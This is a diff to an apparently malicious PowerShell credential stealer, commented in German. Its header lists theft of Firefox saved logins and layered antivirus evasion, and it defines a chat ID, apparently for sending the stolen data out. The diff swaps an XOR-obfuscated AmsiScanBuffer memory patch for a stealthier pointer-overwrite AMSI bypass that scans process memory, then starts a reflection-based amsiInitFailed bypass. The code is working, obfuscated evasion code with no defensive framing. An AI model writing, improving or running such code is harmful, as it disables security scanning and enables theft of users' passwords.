@@ -9,7 +9,7 @@
 #    - Firefox: logins.json (NSS-verschluesselt, Metadaten)
 #
 #  AV-Evasion (3 Schichten):
-#    - L1: AmsiScanBuffer patchen (nativer DLL-Hook, XOR-kodierter Patch)
+#    - L1: AMSI Write-Raid (kein VirtualProtect - IAT-Patch in SMA.dll)
 #    - L2: amsiInitFailed via Reflection (Fallback, obfuskiert)
 #    - L3: ETW/Script-Block-Logging deaktivieren
 #    - Dynamisches P/Invoke fuer advapi32 (kein DllImport-Flag)
@@ -24,16 +24,33 @@ $CHAT_ID   = "1780237079"
 
 # AMSI + ETW: 3-Layer-Bypass
 try {
-    $wk=(Add-Type -MemberDefinition '
-[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
-[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string m);
-[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
-' -Name "WK$(Get-Random)" -PassThru -ErrorAction Stop)[0]
-    $hm=$wk::GetModuleHandle([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108)))
-    $pf=$wk::GetProcAddress($hm,[Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114)))
-    $ov=0;$wk::VirtualProtect($pf,[UIntPtr]6,0x40,[ref]$ov)
-    [Runtime.InteropServices.Marshal]::Copy(([byte[]](0x12,0xFD,0xAA,0xAD,0x2A,0x69)|%{[byte]($_-bxor 0xAA)}),0,$pf,6)
-    $wk::VirtualProtect($pf,[UIntPtr]6,$ov,[ref]$ov)
+    $n="WR$(Get-Random)"
+    $s=@"
+using System;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;
+public class $n{
+[DllImport("kernel32.dll")]public static extern bool ReadProcessMemory(IntPtr h,IntPtr a,byte[]b,uint s,ref uint r);
+[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
+[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true,SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr h,string p);
+[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)]string m);
+[MethodImpl(MethodImplOptions.NoOptimization|MethodImplOptions.NoInlining)]public static int D(){return 1;}
+}
+"@
+    $T=(Add-Type $s -PassThru -ErrorAction Stop)[0]
+    $dl=[Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108))
+    $fn=[Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114))
+    [IntPtr]$fa=$T::GetProcAddress($T::GetModuleHandle($dl),$fn)
+    $asm=[appdomain]::CurrentDomain.GetAssemblies()|?{$_.Location-and($x=$_.FullName.Split(',')[0])-and $x.StartsWith('S')-and $x.EndsWith('n')-and $x.Length-eq 28}|Select -First 1
+    $ut=$asm.GetTypes()|?{$_.Name-and $_.Name.StartsWith('A')-and $_.Name.EndsWith('s')-and $_.Name.Length-eq 9}|Select -First 1
+    $mt=$ut.GetMethods([Reflection.BindingFlags]'Static,NonPublic')|?{$_.Name-and $_.Name.StartsWith('S')-and $_.Name.EndsWith('t')-and $_.Name.Length-eq 11}|Select -First 1
+    [IntPtr]$mp=$mt.MethodHandle.GetFunctionPointer()
+    $hp=$T::GetCurrentProcess();$r=[uint32]0;$pt=[IntPtr]::Zero;$ok=$false
+    for($j=0x50000;$j-lt 0x2000000-and-not $ok;$j+=0x50000){
+        [IntPtr]$ba=[Int64]$mp-$j;$b=[byte[]]::new(0x50000)
+        if($T::ReadProcessMemory($hp,$ba,$b,0x50000,[ref]$r)){
+            for($i=0;$i-lt $b.Length-8;$i++){if([IntPtr][BitConverter]::ToInt64($b,$i)-eq $fa){$pt=[Int64]$ba+$i;$ok=$true;break}}
+        }
+    }
+    if($ok){[IntPtr]$dp=$T.GetMethod('D').MethodHandle.GetFunctionPointer();[Runtime.InteropServices.Marshal]::Copy([IntPtr[]]($dp),0,$pt,1)}
 } catch {}
 try {
     $u=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
